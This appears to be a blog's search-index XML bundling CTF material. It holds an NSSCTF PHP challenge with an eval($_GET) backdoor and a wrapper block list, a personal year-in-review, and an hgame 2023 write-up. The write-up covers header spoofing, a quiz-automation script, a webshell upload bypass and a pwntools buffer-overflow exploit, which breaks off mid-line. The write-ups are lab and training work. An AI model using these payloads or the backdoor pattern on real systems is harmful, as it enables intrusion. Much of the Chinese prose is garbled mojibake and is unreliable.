<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSSCTF Round#8</title>
      <link href="/2023/02/11/NSSCTF-Round-8/"/>
      <url>/2023/02/11/NSSCTF-Round-8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2022</title>
      <link href="/2023/01/20/my2022/"/>
      <url>/2023/01/20/my2022/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°äº†ï¼Œç¥å¤§å®¶æ–°å¹´å¿«ä¹å–½ï¼<br>å¾ˆå¿«ï¼Œ2022å¹´å·²ç»è¿‡å»äº†ï¼Œ2023å¹´å·²ç»è¿‡å»20å¤šå¤©äº†ï¼Œæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚åœ¨è¿‡å»çš„ä¸€å¹´ä¸­è®¤è¯†äº†ä¸€äº›äººï¼Œéƒ½éå¸¸æœ‰è¶£ã€‚ä¹Ÿé‡åˆ°äº†å¾ˆå¤šæœ‰è¶£çš„äº‹æƒ…ã€‚</p><p>æ„Ÿè°¢jackieå“¥ç»™æˆ‘æ¨é‡ä¿ï¼ŒäºŒæœˆä»½å†¬å¥¥ä¼šå»é‡ä¿ï¼Œè®¤è¯†äº†å¥½å‡ ä¸ªæœ‰è¶£çš„å“¥å“¥ï¼Œäººéƒ½æŒºå¥½çš„ï¼Œè¿˜æ€»å¸®æˆ‘ç™»æœºå™¨ã€‚æ„Ÿè°¢ã€‚åé¢è¿˜å¸®ä»–ä»¬å†™äº†ä¸ªå°è„šæœ¬ï¼Œå¸®ä»–ä»¬ç­›é€‰æ—¥å¿—ä¸­æœ‰ç”¨ä¿¡æ¯å¯¼å‡ºexcelï¼Œç”±äºå†…ç½‘ä½¿ç”¨è¿˜å°æˆäº†exeï¼Œå®Œäº‹åé‚£è¾¹çš„å“¥è¯´è´¼è¿˜ç”¨ï¼Œå¸®ä»–ä»¬çœå»äº†90%çš„æ—¶é—´ï¼Œè¿˜å¾ˆæ„Ÿè°¢æˆ‘ã€‚ç¬é—´æ„Ÿè§‰å…¶å®çœ‹è®¾å¤‡ä¸é€‚åˆæˆ‘ï¼Œæˆ‘æ„Ÿè§‰è¿ç»´æ¯”è¾ƒé€‚åˆæˆ‘ã€‚å› ä¸ºï¼Œâ€¦â€¦ã€‚</p><p>å››æœˆä»½å’Œäº”æœˆä»½å§ï¼Œæ„Ÿè°¢ä¿ºä»¬éƒ­è€å¸ˆè®©æˆ‘å¸®ä»–å¸¦äº†åå‡ å¤©è¯¾ï¼Œæ„Ÿè°¢éƒ­è€å¸ˆåˆç»™æˆ‘äº†ä¸€æ¬¡è¿™ä¹ˆå¥½çš„é”»ç‚¼æœºä¼šã€‚æ„Ÿè§‰å½“è€å¸ˆå¥½è¾›è‹¦å•Šï¼Œemmmmï¼Œå…¶å®å½“å¯¼å¸ˆä¸æ˜¯å¾ˆè¾›è‹¦ï¼Œå°±æ˜¯æœ‰äº›ä¸œè¥¿æ˜æ˜åœ¨è¯¾ä¸Šæˆ‘å·²ç»è®²è¿‡äº†ï¼Œç„¶åå‘¢ï¼Œæœ‰åŒå­¦è¯¾ä¸‹åˆæ¥é—®ï¼Œè€Œä¸”è¿˜ä¸æ˜¯ä¸€ä¸ªåŒå­¦é—®ï¼Œå¥½å¤šåŒå­¦éƒ½æ¥é—®ã€‚è¿™é‡Œå¯èƒ½ä¸æ˜¯æˆ‘æ²¡æœ‰è®²è¿‡ï¼Œæ˜¯æˆ‘å¸ƒç½®äº†ä½œä¸šï¼Œéƒ½æ²¡æœ‰å¬ï¼Œæ¥é—®çš„å¾ˆç´¯ã€‚å¸ƒç½®ä½œä¸šä¹Ÿå¾ˆç´¯ã€‚emmmmï¼Œè¿˜æœ‰ä¸€ä¸ªï¼ŒåŒå­¦æŠ„ä½œä¸šä¹ŸæŒºä¸¥é‡çš„ï¼Œé‚£ä½œä¸šæˆªå›¾linuxç”¨æˆ·åéƒ½ä¸€æ ·ï¼Œæˆ‘è£‚å¼€ã€‚çœ‹åˆ°ä½œä¸šï¼Œæˆ‘ç¬é—´æ„Ÿè§‰æˆ‘è¿™ä¸ªè€å¸ˆå½“çš„å¾ˆå¤±è´¥ï¼Œæ²¡æœ‰æ•™ä¼šå¤§å®¶ã€‚æœ€åä¸€ç‚¹ï¼Œè¦æ˜¯å½“è€å¸ˆä¸ç”¨å¸ƒç½®ä½œä¸šï¼Œä¸ç”¨æ”¹ä½œä¸šï¼ŒåŒå­¦ä»¬ä¸è¦ä¸€ç›´é—®åŒä¸€ä¸ªæˆ‘ä¸Šè¯¾è®²è¿‡çš„é—®é¢˜çš„è¯ï¼Œæˆ‘æ„Ÿè§‰å½“è€å¸ˆè¿˜æ˜¯è›®èˆ’æœçš„ã€‚è®²è¯¾åšè§†é¢‘è¿˜æ˜¯è›®ä¸é”™çš„ï¼Œæ²¡æœ‰å”®åã€‚</p><p>ä¸ƒæœˆä»½ï¼Œæ„Ÿè°¢Aä½¬ç»™æˆ‘æ¨äº†ä¸ªè®²ctfè¯¾çš„å…¼èŒã€‚ä»ä¸­ä¹Ÿå­¦åˆ°äº†è®¸å¤šè®²è¯¾çš„æŠ€å·§ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ã€‚æˆ‘è§‰å¾—ç°åœ¨è®©æˆ‘æ‰“2019å¹´é‚£ä¸ªawdæ¯”èµ›ï¼Œæˆ‘ä¸€å®šæ‰“ç©¿ä»–ä»¬ã€‚æ„Ÿè°¢Aä½¬ã€‚</p><p>å…«æœˆä»½è¿˜å›å®¶å­¦äº†ä¸ªè½¦ï¼Œemmmï¼Œéš¾åº¦ä¸­ç­‰å§ï¼Œå¸Œæœ›æ—©ç‚¹æ‹¿åˆ°è¯ï¼Œå°±èƒ½å¼€è½¦äº†ã€‚</p><p>ä¹æœˆï¼Œæ„Ÿè°¢å‡¡å“¥ä¿¡ä»»æˆ‘ï¼Œç»™æˆ‘é”»ç‚¼è‡ªå·±çš„æœºä¼šï¼Œè®©æˆ‘å‚åŠ äº†ä¸ªè®²åº§ã€‚</p><p>åä¸€æœˆä»½çš„å¤©æ´¥å¤§å­¦ç”Ÿctfæ¯”èµ›ï¼Œemmmmï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œåˆèµ›æ‰“çš„è¿˜è¡Œï¼Œå†³èµ›å˜›ï¼Œæ„Ÿè§‰è¿˜æ˜¯è‡ªå·±å¤ªèœäº†ä¸€ç‚¹ï¼Œæ²¡æœ‰å›¢é˜Ÿã€‚ä¸€ä¸ªäººçš„èƒ½åŠ›ç¡®å®æ˜¯æœ‰é™çš„ï¼Œå½“ç„¶ä¸èƒ½æ’é™¤é‚£äº›å…¨æ ˆçš„å¤§ä½¬ï¼Œæ˜¯çœŸçš„å¼ºã€‚æ¯”èµ›ä¹Ÿå°±å¾—äº†äºŒç­‰å¥–ï¼Œå°‘ç‚¹pyï¼Œå°‘ç‚¹ä»£æ‰“ï¼Œæˆ–è®¸æœ‰æœºä¼šæ‹¿ä¸ªä¸€ç­‰å¥–ã€‚ä»¥å­¦ç”Ÿèº«å‚åŠ çš„æ¯”èµ›è¶Šæ¥è¶Šå°‘äº†ï¼Œçæƒœå§ã€‚ä¸è¿‡å®‰å…¨è¿™æ¡è·¯ï¼Œæˆ‘æ˜¯ä¸ä¼šæ”¾å¼ƒçš„ã€‚</p><blockquote><p>åäºŒæœˆä»½å°±æ¯”è¾ƒç‰¹æ®Šäº†ï¼Œè¿™æ˜¯æˆ‘è¿™ä¸€å¹´ä¸­å‘ç”Ÿçš„æœ€å¤§çš„äº‹æƒ…äº†ï¼Œå¾—åˆ°äº†ä¸€ä¸ªæˆ‘å–œæ¬¢çš„å¥³å­©ã€‚ä»æ­¤ä»¥åï¼Œæˆ‘ä¹Ÿå°†ä¸å†æ˜¯å­¤å•çš„ä¸€äººã€‚èº«ä»½ä¹Ÿå¤šäº†ä¸€ä¸ªï¼Œæ„Ÿè§‰è‚©ä¸Šçš„è´£ä»»æ›´é‡äº†äº›ã€‚</p><p>ç»ˆäºå’Œè¿‡å»è¯´äº†å†è§ï¼Œæ˜¯æ—¶å€™å¼€å§‹æ–°çš„ç”Ÿæ´»äº†ã€‚</p><p><img src="/images/my2022/1.jpg" alt="image-20220130142802861"></p></blockquote><p>å¸Œæœ›æ˜å¹´å¯ä»¥æ‰¾åˆ°ä¸€ä»½å®ä¹ å·¥ä½œï¼Œå¤šå¤šæ›´æ–°åšå®¢ã€‚</p><p>éœ€è¦æ„Ÿè°¢çš„äººå¤ªå¤šï¼Œå¯¹æˆ‘çš„å¥½æˆ‘éƒ½è®°å¾—ã€‚</p><p>â€œæˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚â€</p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><blockquote><p>ç”Ÿæ—¥å¿«ä¹~<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023hgameéƒ¨åˆ†wp</title>
      <link href="/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>ç®€å•js,æˆ‘ä»¬å³é”®æºä»£ç ä¸€ä¸‹ï¼Œç¿»ä¸€ç¿»jsæ–‡ä»¶ç›´æ¥æœhgame æ²¡æœ‰ï¼Œé‚£è‚¯å®šæ—¶ç¼–ç æˆ–è€…åŠ å¯†äº†ï¼Œæ‰¾æ‰¾å¯ç–‘å­—ç¬¦ä¸²ï¼Œæ‹¿å»è§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152018877.png" alt="image-20230106152018877"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function mota() &#123;</span><br><span class="line">  var a = [&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;];</span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152036326.png" alt="image-20230106152036326"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h4><p>å…¸å‹headerå¤´è¯·æ±‚ï¼Œcookieé‚£ä¸ªè¿˜æŒºéš¾æƒ³çš„emmmm</p><p>Referer: bunnybunnybunny.com<br>X-Forwarded-For: 127.0.0.1</p><p>Cookie: code=Vidar</p><p>{â€œusernameâ€:â€luckytodayâ€,â€passwordâ€:â€happy123â€}</p><figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1 http</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Host: week-1.hgame.lwsec.cn:30417</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106172621452.png" alt="image-20230106172621452"></p><h4 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h4><p>è¿™é¢˜æ²¡æœ‰ç”¨hintï¼Œç›´æ¥å…¨é€‰å¤åˆ¶çš„é‚£ä¸ªé¡µé¢ï¼Œç„¶å è„šæœ¬æœ‰ç‚¹éº»çƒ¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ba1van4ba1van4</span></span><br><span class="line"><span class="string">21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yolandeyolande</span></span><br><span class="line"><span class="string">21çº§ / éå¸¸èœçš„å¯†ç æ‰‹ / å¾ˆæ‡’çš„æ‘¸é±¼çˆ±å¥½è€…ï¼Œæœ‰ç‚¹å‘†ï¼Œæƒ³å­¦ç‚¹åˆ«çš„ä½†æ˜¯ä¸€ç›´å¼€æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t0hkat0hka</span></span><br><span class="line"><span class="string">21çº§ / æ—¥å¸¸è‡ªé—­çš„Reæ‰‹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h4kuy4h4kuy4</span></span><br><span class="line"><span class="string">21çº§ / èœé¸¡pwnæ‰‹ / åˆèœåˆçˆ±æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> s1:<span class="comment"># åˆ¤æ–­æ˜¯å¦æœ‰ç©ºå€¼åœ¨åˆ—è¡¨ä¸­</span></span><br><span class="line">    s1.remove(<span class="string">&quot;&quot;</span>)<span class="comment"># å¦‚æœæœ‰å°±ç›´æ¥é€šè¿‡removeåˆ é™¤</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        key = s1[i][<span class="number">0</span>:<span class="built_in">int</span>(<span class="built_in">len</span>(s1[i])/<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(key)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = s1[i]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        d[key]=value</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#é”®å’Œå€¼äº’æ¢</span></span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(d.values(), d.keys()))</span><br><span class="line"><span class="comment">#21:mingzi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = <span class="string">&quot;session=MTY3MzA3MjkwM3xEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUI0R2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfKAl_lYBbx-VHq4BBl3686G2F3ThoYf7RvWQiatnCUqN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getQuestion&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: session,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    text = requests.get(url,headers=headers)</span><br><span class="line">    ans = <span class="built_in">eval</span>(text.text)</span><br><span class="line">    <span class="comment">#&#123;&#x27;message&#x27;: &#x27;20çº§ / WEB / èœçš„æŠ è„š / æƒ³å­¦GO&#x27;&#125;</span></span><br><span class="line">    answord = <span class="built_in">str</span>(ans[<span class="string">&#x27;message&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(answord)</span><br><span class="line">    <span class="keyword">if</span> answord <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="built_in">print</span>(d[answord])</span><br><span class="line">        daan = d[answord]</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: daan,</span><br><span class="line">    &#125;</span><br><span class="line">        url_verifyAnswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/verifyAnswer&quot;</span></span><br><span class="line">        text_verifyAnswer = requests.post(url = url_verifyAnswer,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.text)</span></span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        url_Score = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getScore&quot;</span></span><br><span class="line">        text_Score = requests.get(url = url_Score,data=data,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(text_Score.text)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        sesson = re.findall(<span class="string">&quot;(.*?); Path=/&quot;</span>,text_verifyAnswer.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        session = sesson[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h4 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h4><p>ç®€å•æ–‡ä»¶ä¸Šä¼ ï¼Œé»‘åå•çš„php fuzzä¸€ä¸‹ï¼Œå¤§å°å†™ç»•è¿‡å°±å¯ä»¥äº†ï¼Œä¸Šä¼ shellä¹‹åï¼Œèšå‰‘ï¼Œflagåœ¨è·Ÿä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107160532176.png" alt="image-20230107160532176"></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>ç®€å•rsa n,e,d,éƒ½ç»™äº†ï¼Œä½¿ç”¨å¤§ä½¬çš„å·¥å…·æ‰€å°±è¡Œäº†</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107161606240.png" alt="image-20230107161606240"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h4><p>nc ip port å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><h4 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h4><p>è¿™ä¸ªç®€å•æº¢å‡ºé¢˜æ²¡è§è¿‡ï¼Œè®°å½•ä¸€ä¸‹<br>ç‚¹å‡»mainå‡½æ•°ï¼Œç„¶åF5æŸ¥çœ‹ä¼ªæºç ,å¯ä»¥çœ‹åˆ°bufå¤„å­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯æœ‰ä¸ªclose(1)ï¼Œ<br>closeï¼ˆ1ï¼‰å…³é—­äº†æ ‡å‡†è¾“å‡º<br>å‚è€ƒ<code>https://blog.csdn.net/xirenwang/article/details/104139866</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ˆ 10+8 backdoor 401176</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170004991.png" alt="image-20230207170004991"></p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170036399.png" alt="image-20230207170036399"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="string">&quot;32588&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span 